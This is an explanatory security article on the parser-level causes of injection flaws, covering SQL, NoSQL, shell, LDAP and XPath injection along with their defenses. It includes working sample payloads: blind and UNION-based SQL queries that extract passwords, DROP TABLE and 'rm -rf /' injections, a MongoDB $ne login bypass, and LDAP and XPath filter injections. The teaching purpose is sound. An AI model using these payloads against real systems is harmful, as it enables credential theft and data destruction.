# Injection Vulnerabilities — Theory and Interpreter Mistakes

A deep, parser-centric exploration of why injection vulnerabilities exist. Where the cheatsheet teaches *how to prevent* injection, this page explains *why* injection is possible: the tokenizer, parser, and deserializer mistakes that turn untrusted bytes into trusted code. The theme throughout is that injection is not a list of bugs to memorize — it is a single anti-pattern that recurs everywhere data crosses a parser boundary.

## Setup — What Makes Injection Possible

Every injection vulnerability ever cataloged is, at its core, the same mistake. A program receives data from an untrusted source. The program then constructs a string by concatenating that data with code-like text. The resulting string is handed to an interpreter — a SQL engine, a shell, an XML parser, a JavaScript runtime, a deserializer — and that interpreter, lacking any way to know which bytes were authored by the developer and which were authored by the attacker, treats them all as trusted code.

The universal root cause has a name: **string-concat-then-parse**. It is the anti-pattern that ties SQL injection, command injection, LDAP injection, XPath injection, SSTI, XSS, header injection, and CSV formula injection into one family. Each vulnerability looks superficially different because the interpreter is different. A SQL engine has different syntax from /bin/sh, which has different syntax from Jinja2, which has different syntax from Java's ObjectInputStream. But the underlying structural mistake is identical: a developer treats untrusted bytes as if they were authored by a trusted programmer, and an interpreter dutifully parses the concatenated result without distinguishing intent.

The reason this anti-pattern is so seductive is that strings are the universal interchange format. Every programming language can concatenate strings. Every interface — HTTP, files, sockets, command-line — is fundamentally a stream of bytes that gets interpreted as a string somewhere. So when a developer wants to "build a SQL query with a search term in it," the natural action — the one with the lowest cognitive load and shortest code — is to concatenate the search term into the query. The query is a string. The search term is a string. String concatenation is a built-in operator. It feels right.

What makes it wrong is the second half: the **then-parse**. The concatenated string is handed to an interpreter that performs lexical analysis (tokenization), syntactic analysis (parsing), and finally semantic action (execution). The interpreter cannot recover the developer's intent from the resulting bytes. If the bytes form a syntactically valid SQL statement that drops a table, the interpreter drops the table. The interpreter does not know that the `OR 1=1` substring originated from an HTTP form field rather than from the developer's keyboard.

This sounds obvious when stated baldly, and yet the bug recurs constantly. Consider why. In every language, string concatenation is right there in the standard library, demanding nothing of the developer. Parameterization, by contrast, requires:

1. Knowing the right API exists.
2. Constructing a placeholder string with the correct syntax for the database.
3. Passing the values as a separate argument, in the correct order.
4. Trusting that the parameter binding really happens at the protocol layer.

For a one-off query during a debugging session, none of that pressure exists. A developer types `"SELECT * FROM users WHERE id = " + user_id` into a REPL, sees the answer, and copies the line into production code. The bug is born. Months later, an attacker submits `1 OR 1=1; DROP TABLE users; --` and the interpreter, faithful to its grammar, executes precisely what the bytes describe.

The deepest framing is this: injection vulnerabilities are not memory-safety bugs, not race conditions, not arithmetic errors. They are **type confusion** at the semantic level. The developer believes they are passing a value (a piece of data). The interpreter believes it is parsing a program (a piece of code). In every secure programming model — parameterized queries, argv arrays, CSP nonces, Trusted Types — the fix has the same shape: the value and the code travel through different channels, and the interpreter has no way to confuse them.

For the rest of this document, we descend through the layers — tokenizer, parser, deserializer, interpreter — and watch the same anti-pattern emerge in form after form, language after language, year after year. The lesson at the bottom is unsurprising once you see it laid out: **wherever untrusted bytes are concatenated with code, an injection vulnerability will eventually be discovered there.** The only durable defense is to choose APIs that make concatenation impossible.

## Parser-vs-Tokenizer-vs-Deserializer Taxonomy

A useful taxonomy emerges if we ask, "at which stage of interpretation does the attacker's payload escape its expected role?" Different injection classes correspond to mistakes at different parsing layers.

**Tokenizer-level injection (SQL, shell, LDAP filter syntax).** The interpreter has not yet built an abstract syntax tree. It is still performing lexical analysis — scanning characters and grouping them into tokens. Tokens like keywords (`SELECT`, `FROM`, `WHERE`), operators (`=`, `<`, `OR`), identifiers (table and column names), and literals (numbers, strings, dates) are the atoms of the language. A lexer's job is to walk the input byte-by-byte and emit a stream of these tokens. When user-supplied data is concatenated into the source text, the lexer cannot see the boundary between developer-authored bytes and attacker-authored bytes. A single quote inside an attacker-controlled string can close a string literal and then begin the next token as a keyword. This is the heart of classical SQL injection: a quote character ceases to be data and becomes syntax. Shell injection has the same flavor — a `;` byte ceases to be data and becomes a command separator.

**Parser-level injection (XML, JSON, YAML, XPath).** Here the lexer has tokenized successfully and the parser is constructing a tree from the token stream. The injection exploits the structural rules of the grammar, not the lexer-level character-class rules. XML's `<!ENTITY>` declarations alter the parse tree by introducing references that are dereferenced later. YAML's anchor-and-alias system can be redirected. JSON Schema oversights let attackers smuggle additional fields into objects. XPath query strings allow `or` and `and` operators that change the predicate semantics. The defining property of parser-level injection is that no character-level escape solves it; the attacker is operating on tokens that are already-valid in the host language and using the language's own rules against the developer.

**Deserializer-level injection (Pickle, Java ObjectInputStream, .NET BinaryFormatter, Ruby Marshal, PHP unserialize, YAML with object support).** Now we have moved past parsing into reconstruction. A deserializer reads bytes that describe an object graph and recreates the objects. Some serialization formats — many designed in an era when remote-code-execution wasn't part of the threat model — encode not just data but also instructions for *how to construct* an object. When construction logic is hooked into general-purpose code (a constructor that runs `subprocess.Popen`, a transformer that invokes any callable, a `__reduce__` method that runs arbitrary functions), the bytes describing "how to build this object" become a Turing-complete program. The attacker submits a serialized payload and the deserializer obediently runs it. The relevant detail: nothing in the format had to be malformed. The attacker exploits the fact that the format permits more behavior than the developer intended.

**Interpreter-level injection (eval, exec, template-injection, JavaScript Function constructor).** The most direct: the developer literally hands user input to an interpreter via a function whose entire purpose is to execute strings as code. `eval("1 + 1")` returns 2; `eval(user_input)` runs whatever the user types. Server-side template injection (SSTI) is a special case where the interpreter is a templating engine: the developer hands user input to Jinja2 or Twig and the engine, finding `{{}}` constructs, dutifully evaluates them. The "interpretation" stage in this class is the entire point of the API. There is no parser-vs-data confusion to fix; the API has no concept of data at all.

The taxonomy clarifies why different defenses apply at different layers. Tokenizer-level mistakes are fixable by **parameterization** — the value bypasses the lexer entirely. Parser-level mistakes need **schema validation and feature disabling** — the parser is told to refuse certain constructs. Deserializer-level mistakes require **format restriction** — switch from pickle to JSON, from BinaryFormatter to System.Text.Json. Interpreter-level mistakes require **never passing untrusted input to the interpreter at all**, full stop.

The taxonomy is also predictive. New injection classes get discovered every year, and they always slot into one of these layers. GraphQL injection? Parser-level (the GraphQL grammar is exploited). Prompt injection in LLMs? Interpreter-level (the entire purpose of the LLM is to execute the bytes you give it). Server-side request forgery? Effectively a tokenizer-level mistake — URL parsing libraries disagree about which character ends the host. We will return to that case later.

## SQL Injection Theory

To understand why parameterization works, we must understand the SQL grammar at a level deeper than the textbook examples suggest. Consider the statement:

```sql
SELECT id, email FROM users WHERE name = 'alice' AND active = 1;
```

A SQL lexer walks this character-by-character and emits tokens. The tokenization rules vary slightly between dialects (Postgres, MySQL, SQLite, SQL Server, Oracle) but the broad strokes are universal:

1. Skip whitespace.
2. Recognize keywords by matching reserved words case-insensitively (`SELECT`, `FROM`, `WHERE`, `AND`).
3. Recognize identifiers by reading letters, digits, and underscores starting with a letter or underscore (`id`, `email`, `users`, `name`, `active`).
4. Recognize string literals by reading from `'` to the next unescaped `'` (`'alice'`).
5. Recognize numeric literals by reading digits (`1`).
6. Recognize operators (`=`, `,`, `;`).

The lexer cannot ask, "is this token *intended* to be a string literal?" It only asks, "what is the next character, and what state am I in?" Inside a string-literal state, the lexer reads characters until it finds the closing quote. Outside the string-literal state, every character is a candidate for keyword/operator/identifier classification.

Now consider the developer-authored fragment plus the attacker payload:

```sql
SELECT id, email FROM users WHERE name = 'alice'; DROP TABLE users; --';
```

The lexer reads `'alice'`, closes the string. The next character is `;`, an operator. After the `;`, it begins lexing a new statement. It sees `DROP`, a keyword. Then `TABLE`, a keyword. Then `users`, an identifier. Then `;`, ending the second statement. Then `--`, the start of a comment, which extends to end of line, swallowing the trailing `';`. The lexer succeeds completely. The parser succeeds. The executor runs both statements.

There is no malformed input here, no buffer overflow, no exotic character. The single quote in `'alice'` is a perfectly valid byte. The semicolon is valid. The `--` is valid. Everything is grammatical SQL. The developer's mental model — "I am inserting alice's name into the WHERE clause" — and the database's actual behavior — "I am parsing two statements" — diverge at exactly the point where the developer's authorship ended and the attacker's began.

The fix is to defer binding. **Parameterization** does not escape the value; it never lets the value reach the lexer at all. Instead the developer writes:

```sql
SELECT id, email FROM users WHERE name = $1 AND active = $2;
```

This statement is sent to the database server. The lexer reads it, recognizing `$1` and `$2` as **parameter placeholders** (Postgres syntax; MySQL uses `?`; SQL Server uses `@p1`; Oracle uses `:p1`). The parser builds an AST. The query planner produces an execution plan. None of this involves the values yet.

Then, in a separate protocol message, the client sends the values: `["alice", 1]`. The database server attaches these values to the placeholders **inside the AST**, after parsing is complete. The values are not lexed. They cannot become tokens. They cannot become keywords. They are bound to the leaf nodes of the parse tree where the placeholders sat.

This is what "prepared statements at the database protocol layer" means concretely. Postgres uses the **extended query protocol**, with three distinct messages:

- `Parse` — sends the SQL statement with placeholders, gets back a named statement handle.
- `Bind` — sends the values to fill in the placeholders, gets back a named portal.
- `Execute` — runs the portal, returns rows.

The Parse step lexes and parses once. The Bind step does no lexing of values; values travel as length-prefixed binary or text data fields. The Execute step runs the prepared plan against the bound values. Three steps. The values never see the lexer.

MySQL has a similar split with `COM_STMT_PREPARE` and `COM_STMT_EXECUTE`. SQL Server uses `sp_prepare` / `sp_execute`. Oracle has its own preparation cycle. The shapes differ; the principle is identical: **the value bypasses the lexer because the lexer ran before the value existed**.

A subtle implication: parameterization works precisely because of this protocol-level separation. If a "parameterization" library actually concatenates the value into the SQL string client-side (as some old MySQL connector libraries did with `mysql_real_escape_string`), it is not parameterization. It is escaping, which is fragile. Real parameterization sends the value over the wire as a separate field, one wire-protocol step removed from the SQL text.

## Why Parameterization Works

We can now state the principle plainly: **parameterization works because the value travels through a different channel from the code, and the channels are joined only after parsing is complete**.

Imagine the database server as a function with two arguments: a parsed query plan, and a list of values. Parameterization is the act of preparing these two arguments separately and combining them only at the bottom of the call stack, where execution happens. The query plan is the trusted code; it was constructed from a SQL string the developer wrote and the database parsed. The values are the untrusted data; they are bytes from the network. The two never mix.

In the wrong design — string concatenation — the values become part of the SQL string before parsing. The parser sees one stream of bytes and cannot distinguish authorship. In the right design, the parser only ever sees developer-authored bytes. The attacker can submit any payload they want; it will be bound to a placeholder, treated as a string or number or date according to the placeholder's type, and never relexed.

The same protocol-level separation appears in every secure interpreter API:

- **Shell**: `execve(2)` takes `argv` as an array. The kernel does not parse `argv[0]` for shell metacharacters. The args are presented to the new process as separate strings.
- **HTML rendering**: React's `setProps` takes JavaScript values; these get inserted into the DOM as text nodes (escaped) or attribute values (escaped). Untrusted values cannot become tags or scripts because they never become a string that gets re-parsed as HTML.
- **Logging**: structured logging libraries like zerolog take key-value pairs and serialize them to JSON. Newlines in a value cannot end the log line because the JSON encoder escapes them.

In every case, the value is a typed entity, not a string fragment. The "type" is the channel that protects the value from re-parsing.

A corollary: if your library exposes a "parameterize" API but the values still travel through a string interpolation layer somewhere, you have not parameterized. You have postponed the bug. This is why ORMs that build their own DSLs — Django's QuerySet, SQLAlchemy's Core, ActiveRecord's Arel — are safer than ORMs that compose SQL strings. The DSL forces you to express the query as a tree of typed objects; the SQL serialization happens in one trusted code path, and the values reach the database via the prepared-statement protocol. You cannot accidentally concatenate; the API does not give you a string to concatenate into.

The exceptions, of course, are the explicit string-construction APIs: SQLAlchemy's `text()`, Django's `.raw()` or `.extra()`, ActiveRecord's `find_by_sql`. These exist for cases where the ORM cannot express what the developer needs (window functions, recursive CTEs, vendor-specific syntax). They are sharp tools and should be used with the same care as raw SQL. If the developer reaches for `text()`, the ORM steps out of the way and the developer is responsible for parameterization.

## ORM-Level Parameterization

Examining a few ORMs sharpens the picture.

**SQLAlchemy** (Python) has two layers: the Core and the ORM. The Core is the SQL expression language; queries are constructed as Python objects (`select`, `Table`, `Column`, `and_`, `or_`, `func`). When compiled, the Core walks the expression tree and emits SQL with placeholders, gathering values into a separate list. The result is a `Compiled` object containing the parameterized SQL and the values, which is handed to the database driver.

When developers need to escape into raw SQL, SQLAlchemy provides `text()`:

```python
from sqlalchemy import text

stmt = text("SELECT id, email FROM users WHERE name = :name").bindparams(name="alice")
```

The `:name` syntax is SQLAlchemy's named parameter convention. `bindparams` attaches the value to the parameter, and SQLAlchemy compiles the result into a parameterized query just as the Core would. The bug arises when developers use `text()` without `bindparams`, concatenating values into the string:

```python
stmt = text(f"SELECT id, email FROM users WHERE name = '{name}'")  # vulnerable
```

This is just string concatenation with extra steps.

**Django**'s ORM is a layer up: the QuerySet API expresses queries through method chaining (`User.objects.filter(name="alice")`), and the underlying machinery generates parameterized SQL automatically. The developer has no SQL string to mishandle. The escape hatch is `.raw()` and `.extra()`, both of which accept positional or named parameters:

```python
users = User.objects.raw("SELECT id, email FROM auth_user WHERE name = %s", [name])
```

Django uses `%s` (DB-API style) regardless of the underlying database. The parameter list is separate. As long as developers pass the values via the second argument, parameterization is preserved. The mistake — `User.objects.raw(f"... WHERE name = '{name}'")` — is unambiguous SQL injection, and it has been the source of many CVEs in third-party Django apps.

**ActiveRecord** (Ruby on Rails) uses `where` with hash arguments for safety, but offers many escape hatches. The dangerous pattern:

```ruby
User.where("name = '#{params[:name]}'")  # vulnerable
```

The safe equivalent:

```ruby
User.where("name = ?", params[:name])
User.where(name: params[:name])
```

ActiveRecord also exposes `sanitize_sql_array`, `connection.quote`, and friends for cases where developers need to build SQL fragments. These are escape APIs (they produce escaped strings), not parameterization APIs (which produce protocol-level binds). Escape APIs are correct if used precisely; they are fragile across SQL dialects and exotic character sets. Parameterization is preferred when available.

**Sequel** (Ruby) has `Sequel.lit` for literal SQL fragments, with placeholders:

```ruby
DB[:users].where(Sequel.lit("name = ?", name))
```

The principle is the same: the literal fragment contains no untrusted data; the values are passed separately and parameterized.

The lesson across ORMs: every one of them has a safe default and an escape hatch. The safe default is the structured API; the escape hatch is the string-with-placeholder API; the catastrophe is the string-with-interpolation usage of the escape hatch. Almost every SQL injection found in modern codebases lives in the third category — a developer used `text()` or `.raw()` or `.where("...")` and forgot the placeholder.

## Boolean and Time-Based Blind SQLi

Classical SQL injection assumes the attacker can see the query's output (or at least its error messages). What if the application returns only "found" or "not found"? What if the application returns 200 OK regardless of the query? **Blind SQL injection** answers these questions with two channels: a boolean channel and a time channel.

**Boolean-based blind SQLi** uses the application's binary response (logged-in vs not, item-found vs not, error-or-not) as a one-bit oracle. The attacker constructs a payload like:

```sql
' OR (SELECT SUBSTR(password, 1, 1) FROM users WHERE id=1) = 'a' --
```

If the application's response indicates "true" (logged in), the first character of user 1's password is `a`. If "false," try `b`, `c`, ..., until 256 candidates exhaust the byte. Then move on to the second character. The information rate is one bit per HTTP request — slow, but tractable for a few hours of exfiltration.

The trick generalizes to any datum: row counts, column names from `information_schema`, the database version string, the contents of `/etc/passwd` after a successful `LOAD_FILE` (in MySQL with FILE privilege). A binary oracle plus enough requests is equivalent to full read access.

**Time-based blind SQLi** removes even the boolean signal. The attacker constructs a payload that conditionally executes a sleep:

```sql
' AND IF((SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='a', SLEEP(5), 0) -- 
```

If the first character is `a`, the response takes 5+ seconds. Otherwise, the response is fast. The time difference is the channel. Postgres uses `pg_sleep(5)`. SQL Server uses `WAITFOR DELAY '00:00:05'`. SQLite has no portable sleep but supports `randomblob(N)` as a CPU sink. The time channel works even when the application returns identical responses for true and false branches.

A common, more efficient construction uses `CASE WHEN`:

```sql
' AND (CASE WHEN (SELECT SUBSTR(...))='a' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL --
```

The `CASE` expression allows complex conditional logic without coupling to specific dialect-level conditional functions. Combined with binary search — testing whether the byte is greater or less than the midpoint of `[0, 255]` — the attacker reduces extraction from 256 requests-per-byte to 8 requests-per-byte.

Blind SQLi is the proof, if any were needed, that error-message scrubbing is not a defense against SQL injection. Hiding errors does not change the underlying parser confusion; it only forces the attacker to use a slower channel. The fix is the same as for visible SQLi: parameterize.

## UNION-Based SQLi

When the application *does* show query output and the injectable parameter is in the `SELECT` clause, the attacker can use SQL's `UNION` operator to graft an arbitrary query onto the original. The attack proceeds in stages.

**Stage 1: column count.** `UNION` requires the two queries to have the same number of columns. The attacker probes:

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

incrementing until the query no longer errors. The number of NULLs that succeeds equals the column count of the original query. (NULL is used because every SQL type accepts NULL, sidestepping type-mismatch errors.)

**Stage 2: column types.** Replace each NULL one at a time with a string literal, e.g., `'a'`, to find which columns are textual and can carry exfiltrated data:

```sql
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --
```

The successful queries identify text-compatible columns.

**Stage 3: enumeration via information_schema.** Most SQL databases expose metadata via `information_schema` (Postgres, MySQL) or `sys` (SQL Server) or system tables like `sqlite_master` (SQLite) or `ALL_TABLES` (Oracle). A typical exfiltration query:

```sql
' UNION SELECT table_name, NULL, NULL FROM information_schema.tables --
```

This dumps every table name into the query result. Subsequent queries enumerate columns:

```sql
' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='users' --
```

And then dump rows:

```sql
' UNION SELECT email, password, NULL FROM users --
```

The `ORDER BY NULL` trick is sometimes used to bypass differences in column-numbering across dialects; `LIMIT n,1` paginates through the dump.

UNION-based SQLi is the most direct route from injection to data exfiltration. It requires that:

1. The injection point is a `SELECT` query.
2. The application displays the query's result (at least the first row or a list).
3. The number and types of columns can be probed.

When all three conditions hold, the attacker reads every row in the database in linear time. When they don't hold — POST endpoints that don't return rows, error-suppressed responses, single-row endpoints — the attacker falls back to blind techniques.

## Stored Procedures Trap

Stored procedures are sometimes presented as a security mitigation: "If we use stored procedures, we are safe from SQL injection." This is, regrettably, false. Stored procedures move the SQL into the database, but if the procedure body itself uses dynamic SQL with concatenation, the injection vulnerability is now inside the database where it is harder to find.

Consider an Oracle PL/SQL procedure:

```sql
CREATE OR REPLACE PROCEDURE find_user(name_in IN VARCHAR2) IS
BEGIN
  EXECUTE IMMEDIATE 'SELECT * FROM users WHERE name = ''' || name_in || '''';
END;
```

`EXECUTE IMMEDIATE` parses the string at runtime. Concatenating `name_in` into the string reintroduces the same lexer-confusion vulnerability that parameterization is meant to prevent. Calling `find_user('alice'' OR 1=1 --')` injects the same way as a concatenated query in the application layer.

T-SQL has the same trap with `sp_executesql`:

```sql
DECLARE @sql NVARCHAR(1000);
SET @sql = 'SELECT * FROM users WHERE name = ''' + @name + '''';
EXEC sp_executesql @sql;
```

Vulnerable.

The defense within stored procedures is the same as in application code: bind parameters explicitly. PL/SQL:

```sql
EXECUTE IMMEDIATE 'SELECT * FROM users WHERE name = :1' USING name_in;
```

T-SQL:

```sql
EXEC sp_executesql 
  N'SELECT * FROM users WHERE name = @n', 
  N'@n NVARCHAR(100)', 
  @n = @name;
```

Both bind the value as a parameter at the protocol level. The string is parsed once; the value is bound after.

The takeaway: stored procedures are not a defense against SQL injection. They can be a vector. The defense is parameterization — at every layer, including inside procedure bodies.

## Identifier Injection

A critical edge of parameterization: **placeholders only work for values, not for identifiers**. Table names, column names, and `ORDER BY` columns must be present in the parsed SQL before the database knows which tables to look up, what permissions to check, and what indices to use. They are part of the query's structure, not its data. The wire protocol has no placeholder for "table name."

This means a query like:

```sql
SELECT id, email FROM users ORDER BY <user_supplied_column>
```

cannot be parameterized in the conventional sense. If you do `SELECT ... ORDER BY $1` and bind `name`, the database treats the bound string as a string literal — `ORDER BY 'name'` — which orders by a constant string (i.e., does nothing useful). The placeholder is not interpreted as an identifier.

The defense is **allowlisting at the application layer**:

```python
ALLOWED_SORT_COLUMNS = {"name", "email", "created_at"}

if sort_col not in ALLOWED_SORT_COLUMNS:
    raise ValueError("invalid sort column")

query = f"SELECT id, email FROM users ORDER BY {sort_col}"
```

The user supplies a column name; the application maps it through a hard-coded set; if not present, the request fails. The set is small enough to enumerate, the columns are part of the developer's schema, and the resulting interpolation is safe because every reachable value in the set is developer-authored.

A related case: `LIMIT` and `OFFSET`. Some databases accept parameters for these (Postgres does); others (older SQL Server) require literals. When a parameter is unavailable, the safe pattern is to cast to integer at the application layer:

```python
limit = int(request.args.get("limit", 10))
query = f"SELECT ... LIMIT {limit}"
```

`int()` raises if the input is not numeric, so attackers cannot smuggle SQL syntax through. The cast acts as a coarse-grained allowlist for "must be a number."

The general principle: **wherever parameterization is unavailable, use the strongest type-system or allowlist constraint that fits the use case**. Integers are constrained by `int()` casting. Sort columns are constrained by membership in a small set. Boolean direction (`ASC` / `DESC`) is constrained by an `if-else`:

```python
direction = "ASC" if request.args.get("dir") == "asc" else "DESC"
```

Three lines, no concatenation of untrusted bytes, no possibility of injection.

## NoSQL Injection

The marketing for NoSQL databases occasionally implied that NoSQL was inherently safer than SQL — without a SQL parser, what could go wrong? The answer, of course, is that every NoSQL database has its own query language (sometimes a JSON-shaped DSL, sometimes a Lua-like scripting layer), and that language has its own parser, with its own injection-equivalent vulnerabilities.

**MongoDB** is the canonical example. Its query language is JSON-based, with operators prefixed by `$` (`$eq`, `$ne`, `$gt`, `$where`, `$regex`, etc.). A typical query:

```javascript
db.users.find({ name: req.body.name, password: req.body.password })
```

If `req.body` is parsed JSON and the application trusts its types, an attacker can submit:

```json
{ "name": "alice", "password": { "$ne": null } }
```

The `password` field is now an object, not a string. MongoDB interprets `{$ne: null}` as "not equal to null," which matches every user with any password. The query bypasses authentication.

The fix: explicitly cast or validate types at the boundary. If the application expects a string password, force the value to be a string:

```javascript
const password = String(req.body.password); // coerces { $ne: null } to "[object Object]"
```

Or, better, validate against a schema (Joi, Yup, Zod) that rejects non-string passwords outright.

**MongoDB `$where`** is more pernicious. The `$where` operator accepts a JavaScript function executed server-side:

```javascript
db.users.find({ $where: "this.name == '" + name + "'" })
```

If `name` is attacker-controlled, the attacker can submit `'; while (true) {} //` to launch a denial-of-service, or `'; db.users.drop(); //` if the runtime allows it. This is straight code injection — the `$where` operator is a `eval()` in disguise. It should never be used with untrusted input. MongoDB's documentation has, over time, deprecated it in favor of the structured operators.

**Redis** has similar concerns with `EVAL` (server-side Lua). **Cassandra** has CQL with its own injection concerns. **Couchbase** N1QL is SQL-like and has SQL-style injection. The pattern is universal: any query language plus string concatenation equals injection.

The defense is the same: parameterize. MongoDB's drivers parameterize automatically when you pass JSON objects with primitive values; the bug is the type-confusion of treating user-supplied JSON as if it were a string.

## OS Command Injection Theory

Operating-system command injection is the shell counterpart of SQL injection. Like SQL, it has two layers — a tokenizer (the shell's lexer) and an interpreter (the shell's executor) — and like SQL, the bug is that untrusted bytes are concatenated into a string that the shell tokenizes.

But there is a critical difference between SQL and shell that explains why command injection is in some ways easier to prevent: **the kernel never invokes a shell**. The actual system call for running a program is `execve(2)` (and friends `execv`, `execvp`, `execle`, etc.). `execve` takes three arguments: a path to an executable, an argument vector (`argv`, a NULL-terminated array of strings), and an environment vector. The kernel reads the executable, sets up its address space, places `argv` and `envp` on the new process's stack, and jumps to the entry point. There is no parsing of `argv[0]` for shell metacharacters. There is no whitespace splitting. The kernel doesn't even know what `;` means.

When does a shell get involved? Only when a programmer asks for one. In C, `system(3)` and `popen(3)` invoke `/bin/sh -c <string>`. In Python, `subprocess.run(cmd, shell=True)` does the same. In Node.js, `child_process.exec(cmd)` defaults to shell-true. In Ruby, backticks and `system(string)` invoke the shell. In each case, the developer has explicitly opted in to a string-parsing intermediary. The shell tokenizes the string, expanding glob patterns, splitting on whitespace, executing command substitutions, performing parameter expansion, and finally `execve`-ing the resulting argument list.

The shell's lexer is the source of the vulnerability. Consider:

```python
subprocess.run(f"convert {input_file} output.png", shell=True)
```

If `input_file` is `; rm -rf /`, the resulting string is `convert ; rm -rf / output.png`. The shell sees the `;` as a command separator, runs `convert` with no arguments, then runs `rm -rf /`, then runs `output.png` (presumably as a command, failing with "command not found"). The destructive line has already executed.

The defense is to bypass the shell entirely. The argv-form invocation:

```python
subprocess.run(["convert", input_file, "output.png"])
```

passes a list to `subprocess.run`. Python's subprocess module calls `execvp` directly, with `argv = ["convert", input_file, "output.png"]`. The kernel does not parse `input_file`. If `input_file` is `; rm -rf /`, the `convert` program receives that literal string as its first argument and probably emits an error like "Unable to open `; rm -rf /'." No shell is involved; no metacharacter has any meaning.

This is why the universal defense for command injection is: **use the array form, never the string form, never `shell=True`**.

## Why Array-Form Always Works

The array form works because the protocol between the parent process and the kernel — the `execve` system call — does not have a parsing step. Once you hand the kernel an `argv`, the kernel hands that exact `argv` to the new process. There is no opportunity for an attacker-controlled string to become two strings or three strings. There is no opportunity for `;` to terminate a command because there is no command-string to terminate.

This protocol-level separation is exactly analogous to SQL's prepared-statement protocol. The shell's interpreter tokenizes a string; the array-form bypasses the interpreter. The SQL engine's lexer tokenizes a query string; the prepared-statement protocol bypasses the lexer for value bindings. In both cases, the right defense is to never let the untrusted bytes reach the parser.

In Go, the `os/exec` package provides:

```go
cmd := exec.Command("convert", inputFile, "output.png")
cmd.Run()
```

`exec.Command` does not invoke a shell. The first argument is the program name; subsequent arguments form `argv[1:]`. Go's runtime calls `execve` (via `posix_spawn` on macOS, `execve` on Linux) with the `argv` array unchanged.

In Java:

```java
ProcessBuilder pb = new ProcessBuilder("convert", inputFile, "output.png");
pb.start();
```

Again, no shell. Each list element becomes one `argv` entry.

In C:

```c
char *argv[] = {"convert", input_file, "output.png", NULL};
execvp(argv[0], argv);
```

Direct system call, no shell.

The pattern is universal across languages. Whenever you see a code example with a list of strings as command arguments, the shell is not involved. Whenever you see a code example with one string concatenated together, the shell is involved (either via `system`, `popen`, or `shell=True`). The first is safe; the second is suspect.

## Shell Escaping

If you absolutely must invoke a shell — to use shell features like pipes, redirections, glob expansion, command substitution — you have to escape user-controlled data. This is fragile. The shell grammar is complex enough that it is easy to miss an escape rule.

Bash, zsh, ksh, dash, and POSIX `/bin/sh` all expand strings through several layers:

1. **Tilde expansion** — `~` becomes `$HOME`.
2. **Parameter expansion** — `$VAR`, `${VAR}`, `${VAR:-default}`, `${VAR%%suffix}`, etc.
3. **Command substitution** — `$(cmd)`, `` `cmd` ``.
4. **Arithmetic expansion** — `$((expr))`.
5. **Brace expansion** — `{a,b,c}`, `{1..10}`.
6. **Tilde-prefix expansion** within paths.
7. **Word splitting** — splitting on `IFS` (default: space, tab, newline).
8. **Pathname expansion (globbing)** — `*`, `?`, `[abc]`.
9. **Quote removal** — `"`, `'`, `\` removed.
10. **Redirection processing** — `>`, `<`, `>>`, `2>&1`, `<<`, `<<<`.

Each layer has its own metacharacters. Single-quoting strips the meaning of all metacharacters except `'` itself. Double-quoting suppresses globbing and word splitting but allows `$`, `\`, and backticks. Most secure escape implementations wrap the value in single quotes, escaping any embedded single quote by closing the quote, inserting `\'`, and reopening:

```python
def shell_quote(s: str) -> str:
    if not s:
        return "''"
    if all(c.isalnum() or c in "@%+=:,./-" for c in s):
        return s  # no escape needed
    return "'" + s.replace("'", "'\\''") + "'"
```

This is essentially what `shlex.quote` (Python 3+, formerly `pipes.quote`) does. Used correctly, the result is a shell-safe representation of the string. Used incorrectly — e.g., putting it inside double-quotes after the single-quote wrap, or composing it through additional expansions — it fails.

The recommendation in modern Python documentation is explicit: **prefer the array form. If you must use shell, use `shlex.quote` for every piece of untrusted data, and reread the result before deploying.** Go has no built-in shell-quote function because the standard library design intentionally pushes you to `exec.Command`.

A pernicious cross-platform footgun: **Windows has different shell semantics**. `cmd.exe` does not parse the same way as `bash`. Quoting rules differ; `^` is the escape character; `&`, `|`, `<`, `>` have similar meanings but with quirks. Python's `subprocess` on Windows calls `CreateProcess`, which has its own argument-parsing rules (each program parses its own argv from a single command-line string, and most programs use the Microsoft C runtime convention, but some don't). The result is that `subprocess.run(["program", "arg with spaces"])` on Windows is *not* immune to argument-injection in the same way as on Unix, depending on the target program. Python 3.8 added `subprocess` improvements to make Windows quoting more predictable, but the hazard remains. On Windows, prefer well-tested libraries (e.g., `pywin32` for direct Win32 calls) over shell invocation.

## LDAP Injection Theory

LDAP — the Lightweight Directory Access Protocol — has a query language called LDAP filters. Filters look like:

```
(uid=alice)
(&(uid=alice)(objectClass=user))
(|(uid=alice)(uid=bob))
```

The structure is parenthesized expressions: `(attribute operator value)`, with `&` (AND), `|` (OR), and `!` (NOT) as boolean combinators. The filter language has its own grammar — RFC 4515 defines it — and like SQL, it has a tokenizer and a parser.

LDAP injection works the same way as SQL injection: untrusted data is concatenated into a filter string, and the LDAP server parses the resulting string. The classical attack:

```
filter = "(uid=" + user_input + ")"
```

with `user_input = "*"` produces `(uid=*)`, matching every user. With `user_input = "*)(uid=admin"`, the filter becomes `(uid=*)(uid=admin)`, which depending on the server may match additional users. Combining with the boolean operators:

```
user_input = "alice)(|(uid=*"
filter = "(&(uid=alice)(|(uid=*))(password=hash))"
```

The filter now matches alice OR every user, regardless of the password check.

The canonical escape table for LDAP filter strings (RFC 4515 Section 3):

| Character | Escaped form |
|-----------|--------------|
| `\`       | `\5c`        |
| `*`       | `\2a`        |
| `(`       | `\28`        |
| `)`       | `\29`        |
| `\0`      | `\00`        |

The escape format is `\` followed by two hex digits representing the byte. Escaping these five characters is sufficient to neutralize filter injection.

LDAP also has a separate concept of **distinguished names** (DNs) — paths through the directory like `cn=alice,ou=users,dc=example,dc=com`. DNs use a different escape table (RFC 4514), with `,`, `+`, `"`, `\`, `<`, `>`, `;`, `=`, and leading/trailing spaces and `#` requiring escape. Confusing the two escape tables is a common bug.

Modern LDAP libraries provide parameterization (Spring Security's `LdapTemplate`, Python's `ldap3` with `escape_filter_chars`, Java's `LdapEncoder`). The principle is identical to SQL: pass values through a structured API, not via string concatenation.

## XPath Injection

XPath is XML's query language. Like SQL, it has a grammar that mixes structural operators with literals. A typical XPath:

```xpath
//user[name='alice' and password='hash']
```

The brackets are predicates; `and` is a logical operator; `=` compares strings. If a developer concatenates user input into the predicate:

```python
xpath = "//user[name='" + name + "' and password='" + pw + "']"
```

an attacker submits `name = "alice' or '1'='1"`, producing:

```xpath
//user[name='alice' or '1'='1' and password='...']
```

